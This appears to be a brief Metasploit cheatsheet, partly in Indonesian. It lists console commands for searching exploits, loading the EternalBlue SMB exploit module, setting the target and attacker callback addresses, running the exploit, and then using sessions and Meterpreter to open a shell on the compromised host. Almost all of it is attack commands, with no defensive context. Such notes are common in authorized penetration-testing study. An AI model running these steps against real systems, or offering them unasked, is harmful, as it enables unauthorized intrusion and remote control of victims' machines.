# Metasploit Cheatsheet

## Start
```bash
msfconsole

## Search Exploit
- search smb
- search apache
- search vsftpd

## Use Module
use exploit/windows/smb/ms17_010_eternalblue

## Show Options
show options

## Set Target
set RHOSTS IP_TARGET
set LHOST IP_KITA

## Run Exploit
run

## Sessions
sessions -l
sessions -i 1

## Meterpreter Basic
-getuid
-sysinfo
-shell
